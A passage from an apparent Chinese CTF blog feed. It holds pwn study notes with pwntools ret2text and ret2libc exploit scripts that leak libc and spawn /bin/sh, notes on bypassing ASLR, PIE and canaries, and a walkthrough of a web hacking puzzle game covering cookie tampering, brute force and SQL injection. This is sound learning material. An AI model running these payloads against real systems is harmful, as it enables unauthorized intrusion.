class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">    <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 25266)</span></span><br><span class="line">    <span class="comment"># p.sendline(payload1)</span></span><br><span class="line">    p.sendline(payload2)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h1 id="7-ROP链构造"><a href="#7-ROP链构造" class="headerlink" title="7. ROP链构造"></a>7. ROP链构造</h1><p>NX——NO Execute bit(禁止执行位)是应用在CPU上的安全技术，它支持了操作系统级别的DEP——Data Execute Prevention(数据执行保护，Microsoft)。在应用了NX的系统上，(如果可执行文件开启保护)，会把内存中的区域分为只供存储指令和只供存储数据两种。NX bit 被标记在内存分页中使用的页表索引上，如果置1，则该页内存数据不允许被执行，即把所有内容作为数据处理。这样可以防范shellcode注入攻击。</p><p>ROP——Return-Oriented Programming(返回导向编程)技术，允许攻击者在开启了栈不可执行等安全保护技术的情况下，执行恶意代码。</p><p>核心思想是通过栈溢出等方式，改写栈上的控制信息(调用栈，即return address, rbp等)，以控制调用栈，劫持程序控制流并执行一些针对性的命令序列(gadgets)。</p><p>gadgets主要指一些以ret结尾的小段汇编指令，它们的执行通过ret语句和栈上控制的返回地址相连，构成一条ROP链。链的功能是设置寄存器值，泄露信息，调用函数等。</p><h2 id="7-1-Ret2Text"><a href="#7-1-Ret2Text" class="headerlink" title="7.1 Ret2Text"></a>7.1 Ret2Text</h2><p>gadget一般存在于Text中，或者广义上存在于ELF文件中(指令部分)。将返回地址改写为能执行某些特定功能的gadget地址，构造ROP链。</p><p>辅助工具：ropper、pwntools(ELF class)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># backdoor = e.plt[&#x27;system&#x27;]</span></span><br><span class="line">    backdoor = e.symbols[<span class="string">&#x27;backdoor&#x27;</span>]<span class="comment">#参数为函数名字</span></span><br><span class="line">    bin_sh = <span class="built_in">next</span>(e.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment">#在ELF文件中找/bin/sh</span></span><br><span class="line">    poprdi = <span class="number">0x4011eb</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(poprdi) + p64(bin_sh) + p64(backdoor)<span class="comment"># 将当前rdi的值扔掉，bin_sh的地址赋给rdi，作为参数调用backdoor中的system</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><p>如果文件中没有system函数，如果想要调用system函数，要利用到PLT表。</p><h2 id="7-2-Ret2syscall"><a href="#7-2-Ret2syscall" class="headerlink" title="7.2 Ret2syscall"></a>7.2 Ret2syscall</h2><ul><li>一般为静态链接的可执行文件，指令非常多，也提供了许多gadget</li></ul><ul><li>最核心gadget：syscall(int 0x80)</li></ul><ul><li>整体类似Shellcode注入</li></ul><img src="/posts/1c971db4/7.2.1.png" class="" title="静动态链接"><p>静态链接的ELF文件在IDA的函数窗口全是一片白，没有粉色的动态链接。</p><p>利用ROPgadget工具，自行生成ROP链。</p><h2 id="7-3-PLT表和GOT表"><a href="#7-3-PLT表和GOT表" class="headerlink" title="7.3 PLT表和GOT表"></a>7.3 PLT表和GOT表</h2><p><a href="https://blog.csdn.net/qq_52126646/article/details/119494939">GOT表和PLT表</a></p><p>这里的PLT表示<code>.plt</code>，GOT表表示<code>.got.plt</code>。<code>.got</code>存放其它全局符号信息，与<code>.got.plt</code>不同，与<code>.plt</code>关系不大。</p><h2 id="7-4-Ret2libc"><a href="#7-4-Ret2libc" class="headerlink" title="7.4 Ret2libc"></a>7.4 Ret2libc</h2><ul><li>对动态链接文件，一般链接glibc</li></ul><ul><li>glibc链接基址未知，需要进行基址泄露</li></ul><ul><li>一般需要程序循环，可以通过ROP链构造循环</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x400c83</span></span><br><span class="line">penc = <span class="number">0x4009a0</span></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    z(<span class="string">&#x27;b *0x4009d1\nb *0x400aee&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;choice&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(prdi) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(penc)<span class="comment"># 泄露puts函数地址</span></span><br><span class="line">    sla(<span class="string">&#x27;encrypted&#x27;</span>, payload)</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;\x40\x0a&#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;start detecting libc address&#x27;</span>)</span><br><span class="line">    libc_puts = u64(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.success(<span class="string">&#x27;libc puts address found:&#x27;</span> + <span class="built_in">hex</span>(libc_puts))</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts)</span><br><span class="line">    <span class="comment"># libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># libc.select_libc(0)</span></span><br><span class="line">    libc_addr = libc_puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    rtn_addr = <span class="number">0x400b27</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        payload += p64(rtn_addr)<span class="comment"># for align</span></span><br><span class="line">    payload += p64(prdi) + p64(libc_addr + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)) + p64(libc_addr + libc.dump(<span class="string">&quot;system&quot;</span>))</span><br><span class="line">    sla(<span class="string">&#x27;encrypted&#x27;</span>, payload)</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h1 id="8-ELF保护措施及绕过方法"><a href="#8-ELF保护措施及绕过方法" class="headerlink" title="8. ELF保护措施及绕过方法"></a>8. ELF保护措施及绕过方法</h1><h2 id="8-1-ASLR"><a href="#8-1-ASLR" class="headerlink" title="8.1 ASLR"></a>8.1 ASLR</h2><p>ASLR(Address space layout randomization)——地址空间配置随机化</p><p>将可执行文件、共享库、栈、堆的基址随机化，用于防范明确地址的内存破坏攻击，比如ret2libc、stack address。</p><p>应对方法：地址泄露</p><h2 id="8-2-NX"><a href="#8-2-NX" class="headerlink" title="8.2 NX"></a>8.2 NX</h2><p>看[7.ROP链构造]</p><h2 id="8-3-PIE"><a href="#8-3-PIE" class="headerlink" title="8.3 PIE"></a>8.3 PIE</h2><p>PIE(Position-independent executable)——地址无关代码/可执行文件</p><p>无论文件被加载进内存空间的什么地址中，程序都能够正常运行。在共享库链接中有重要作用。共享库文件被动态链接到内存中，PIE使其能正确处理外部引用。在普通ELF文件上，ELF配合ASLR，使其基址不可预测，增加了攻击难度。</p><p>整个ELF文件都会被装载进一个随机偏移的连续内存空间里，只有基址变成了未知，其它都是相同的。</p><p>应对方法：Partial Writing</p><p>程序的加载以内存页(4K)为单位，基地址后3位(hex)一定为0，同一文件被加载进连续地址中。</p><p>一般利用Return Address控制跳转，可通过栈上已有地址，只修改最低3位(2B，4位)值，控制转向</p><h2 id="8-4-Canary"><a href="#8-4-Canary" class="headerlink" title="8.4 Canary"></a>8.4 Canary</h2><p>Canary(Canary in a coal mine)——金丝雀</p><p>一串随机数据，放置在栈数据和控制信息之间，函数开始时被放入，退出前检验，若被修改立即终止程序，极大地防范了栈溢出攻击。</p><p>应对方法：Canary Leak</p><ul><li>覆盖栈到Canary处，利用puts等函数泄露地址</li><li>Canary最低字节为0，防止连带输出</li></ul><p>小技巧：<code>scanf(&quot;%d&quot;);</code>输入”+”不覆盖内存数据</p><h1 id="9-Stack-Pivot"><a href="#9-Stack-Pivot" class="headerlink" title="9. Stack Pivot"></a>9. Stack Pivot</h1><p>假如可供泄露空间过少，或者需要整段可控的栈空间，这就需要使栈帧移向可控栈空间，控制程序执行流转向。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;先存个档。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞渗透" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://example.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>黑客丛林之旅小游戏</title>
    <link href="http://example.com/posts/9589547b.html"/>
    <id>http://example.com/posts/9589547b.html</id>
    <published>2022-04-05T01:29:28.302Z</published>
    <updated>2022-04-11T05:25:37.153Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.fj543.com/hack/">黑客丛林之旅</a></p><p>1-<a href="http://www.fj543.com/hack/?level=1">http://www.fj543.com/hack/?level=1</a></p><blockquote><p>提示语：在浏览器端用脚本进行身份验证是很容易被破解的。(The Client-side authentication is not secure) </p></blockquote><span id="more"></span><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">gogogo</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pwd=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (pwd==<span class="string">&quot;go8990&quot;</span>) &#123;<span class="title function_">alert</span>(<span class="string">&quot;OK,过关了！&quot;</span>);<span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;./?level=222&quot;</span>;&#125; <span class="keyword">else</span> &#123;<span class="title function_">alert</span>(<span class="string">&quot;Error:密码错误！&quot;</span>);<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="title function_">focus</span>();&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2-<a href="http://www.fj543.com/hack/?level=222">http://www.fj543.com/hack/?level=222</a></p><blockquote><p>提示语：这讨厌的脚本，为什么阻止我！(I hate the script,it prevents me) </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">chkPassword</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pwd=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (pwd==<span class="string">&quot;&quot;</span>) &#123;<span class="title function_">alert</span>(<span class="string">&quot;Error:密码不能为空！(Input password please)&quot;</span>);&#125;<span class="keyword">else</span>&#123;<span class="title function_">alert</span>(<span class="string">&quot;Error:密码不能填东西！(Don&#x27;t input password please)&quot;</span>);&#125; <span class="comment">//无论输入什么内容,就是不让你提交！</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;./&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return chkPassword()&quot;</span>&gt;</span></span><br><span class="line">输入密码进入下一关 (Input password please)<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">id</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;act&quot;</span> <span class="attr">id</span>=<span class="string">&quot;act&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pass2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Go&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>script标签里的东西改不了，将表单的<code>return chkPassword()</code>删掉即可。</p><p>3-<a href="http://www.fj543.com/hack/?level=3login">http://www.fj543.com/hack/?level=3login</a></p><blockquote><p>您还没有登录，所以看不到本页的秘密。(You must login to see the secret of this level) </p><p>提示语：这该死的网页，凭什么说我没有登录？(Damn page! Why you say that I didn’t login?)  </p></blockquote><p>在cookie管理器或抓包改cookie，no改成yes即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: ASPSESSIONIDCSSDDSRA=KDLFDAJCJMFKCDDFPJOBMEFA; Hm_lvt_ddc172cd878cb9d6da5a109ab508be16=1631447102; Hm_lpvt_ddc172cd878cb9d6da5a109ab508be16=1631447282; guoguan=2; login=no</span><br></pre></td></tr></table></figure><p>4-<a href="http://www.fj543.com/hack/?level=4ditdah">http://www.fj543.com/hack/?level=4ditdah</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">. .</span><br><span class="line">. _</span><br><span class="line">_ _</span><br><span class="line">_ _ _</span><br><span class="line">_ . _</span><br><span class="line">提示语：向嘀嗒嘀嗒的电子时代老一辈黑客们致敬。(Tribute to the early hackers)  </span><br></pre></td></tr></table></figure><p> 摩斯电码<code>IAMOK</code></p><p>5-<a href="http://www.fj543.com/hack/?level=5crack">http://www.fj543.com/hack/?level=5crack</a></p><blockquote><p>提示语：用流行的加密算法把密码加密成YmFzZTY0aXNvaw==或ad93c1d102ae60f4的形式并不可靠。(Encrypting a password by a popular encryption method is not secure)  </p></blockquote><p><code>YmFzZTY0aXNvaw==</code>有大小写和等号，考虑base64<code>base64isok</code></p><p><code>ad93c1d102ae60f4</code>是MD5<code>520530</code>，但用<code>520530</code>过不了关？？？</p><p>6-<a href="http://www.fj543.com/hack/?level=6por">http://www.fj543.com/hack/?level=6por</a></p><blockquote><p> if mstsc+vnc=9290 then password=MSSQL+MySQL+Oracle<br> password= ？</p><p> 提示语：有些常见的数字要记住。(You should remember some numbers)  </p></blockquote><p>常见端口号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mstsc:3389</span><br><span class="line">vnc:5901</span><br><span class="line">MSSQL:1433</span><br><span class="line">MySQL:3306</span><br><span class="line">Oeacle:1521</span><br></pre></td></tr></table></figure><p>password=1433+3306+1521=6260</p><p>7-<a href="http://www.fj543.com/hack/?level=75901">http://www.fj543.com/hack/?level=75901</a></p><blockquote><p>提示语：眼花缭乱了吧，看电视的时候怎么不会啊！(The password is about a TV program)  </p></blockquote><p>一张GIF动图，拿去<code>Stegsolve</code>把它拆了analyse-&gt;frame browser，拆成6张图，组合起来为<code>8bIGNOREwmUPPERCASEqneWORDS</code>，大写字母的意思是<code>ignore upper words</code>忽略大写字母，所以正确答案为<code>8bwmqne</code>。</p><p>8-<a href="http://www.fj543.com/hack/?level=8bwmqne">http://www.fj543.com/hack/?level=8bwmqne</a></p><blockquote><p>吴世昌的弟弟的网名是什么？(What’s the username of WuShichang’s little brother) </p><p>提示语：小小社工，过这一关主要靠人脑，电脑只是辅助。(Social Engineering.Use your brain more,and use computer less) </p></blockquote><p>吴世昌的弟弟叫吴其昌，吴世昌的网名fj543，推测吴其昌的网名为<code>fj573</code></p><p>9-<a href="http://www.fj543.com/hack/?level=91ie543">http://www.fj543.com/hack/?level=91ie543</a></p><blockquote><p>提示语：使用IE 5.43版本的浏览器访问?level=9token可以得到令牌。(Use IE 5.43 version to browse ?level=9token) </p></blockquote><p>抓包改URL和浏览器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /hack/?level=91ie543 HTTP/1.1</span><br><span class="line">Host: www.fj543.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /hack/?level=9token HTTP/1.1</span><br><span class="line">Host: www.fj543.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 IE 5.43</span><br></pre></td></tr></table></figure><p><code>您的令牌(Token):level9495216</code></p><p>回到原来的URL输入令牌。</p><p>10-<a href="http://www.fj543.com/hack/?level=g1012495216">http://www.fj543.com/hack/?level=g1012495216</a></p><blockquote><p>提示语：请下载<a href="http://www.fj543.com/hack/files/10token.zip">令牌生成器(Token Generator)</a>。解压密码不长,但很复杂。(Download it.The zip password is short,but very complex)  </p></blockquote><p>去winhex查一下是不是真加密，真加密就爆破zip，结果为<code>o0_O</code>。输入密码，执行exe程序生成口令。但当我们点击<code>aux.10.txt</code>后它说找不到文件，用什么文字编辑器都打不开。wp说它属于特殊文件名，只能用cmd打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#type指令打开常规方法无法打开的文件</span><br><span class="line">type \\.[txt文件的绝对路径]</span><br><span class="line">type \\.\C:\Users\dell\Desktop\10token\aux.10.txt</span><br><span class="line">你的令牌(Token):key104957591</span><br><span class="line">只在今天有效(It&#x27;s available only today)</span><br></pre></td></tr></table></figure><p>11-<a href="http://www.fj543.com/hack/?level=lv11">http://www.fj543.com/hack/?level=lv11</a></p><blockquote><p>提示语：一个表情，却是有声有色。(I like the beautiful face and the voice) </p></blockquote><p>用winhex打开看到字符串</p><blockquote><p>GIF89a……——————————password end,and password start——————————RIFF$WAVEfmt</p></blockquote><p>前面是GIF图片，后面RIFF$WAVEfmt是音频文件格式。用winhex将前面的GIF部分删除，剩下的另存为.wav文件，音频说<code>表情加上6688</code>，我的是微笑表情，所以<code>smile6688</code>通过。</p><p>12-<a href="http://www.fj543.com/hack/?level=g1213495759">http://www.fj543.com/hack/?level=g1213495759</a></p><blockquote><p>您需要获取两个临时ID的认证，才能看到本关的秘密！(You should get two Authentication)<br>1.下载第12关认证软件，用它申请认证一个软件临时ID.(Download it. And use it to Authenticate the TempID of software)<br>2.回到此窗口，想办法手工申请认证你的网页临时ID.(Then back to this window.Try to Authenticate the TempID of web)</p><p>提示语：你的网页临时ID是191.半小时内有效，若失效请刷新网页。(This is your TempID of web) </p></blockquote><p>下载解压后win10一定一定要以管理员身份运行，否则根本打不开！</p><blockquote><p>临时ID：455</p><p>在线认证开始(Started)</p><p>验证第一步(step1)…Step1 ok</p><p>验证第二步(step2)…Step2 ok</p><p>已完成软件临时ID的认证。接下来请回到浏览器中申请网页临时ID的认证。(Software TempID is authenticated.Please back to the browser window.Try to Authenticate the TempID of web)</p></blockquote><p>什么都没有，就给了个临时ID，先用winhex打开看看</p><blockquote><p>User-Agent: Mozilla/4.0 (compatible; HackersGameBrowser)</p><p><a href="http://www.fj543.com/hack/">http://www.fj543.com/hack/</a>  寶翄,{Nek(step1)  ?act=step1&amp;code=  寶翄,{孨ek(step2)  ?act=step2&amp;code=  step1ok step2ok</p></blockquote><p>可以看到关键信息<code>?act=step1&amp;code=</code>和<code>?act=step2&amp;code=</code>，提交链接应该就是这些。</p><p>先把刚才的软件临时ID构造<code>http://www.fj543.com/hack/?act=step1&amp;code=455</code>，但会出现以下错误：</p><blockquote><p>Error:你的临时ID应该是162.(Your TempID should be this one) </p></blockquote><p>抓包把User-Agent换成上面那个就可以了。</p><blockquote><p> Step1 ok </p></blockquote><p>接下来获取第二个临时ID，猜测<code>http://www.fj543.com/hack/?act=step2&amp;code=455</code>显示</p><blockquote><p> Error:Bad Code </p></blockquote><p>现在已知code总是3位数，那就直接爆破。有些code都返回了<code>Step2 ok</code>但怎么进去下一关啊？感觉是bug。找到状态302，就是正确code，在URL上打就刷新出第13关入口。</p><p>13-<a href="http://www.fj543.com/hack/?level=13sql">http://www.fj543.com/hack/?level=13sql</a></p><blockquote><p>你的ID是(Your ID)： 154<br>你的密码(Your password)： </p><p>提示语：请从/hack/13sql.asp挖掘出这个ID对应的密码。(Try to find the password for the ID)  </p></blockquote><p>去到<a href="http://www.fj543.com/hack/13sql.asp">http://www.fj543.com/hack/13sql.asp</a></p><blockquote><p>这是一个数据库信息查证页面，提交一个ID，会显示查询结果。(Submit an ID,then it will show you the query result)</p><p>数据库中有这条信息,但我不能直接告诉你密码。(The data exists.But I can’t show you the password)  </p></blockquote><p>POST形式的SQL注入，也可以用sqlmap自动化注入，参数可以抓包看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 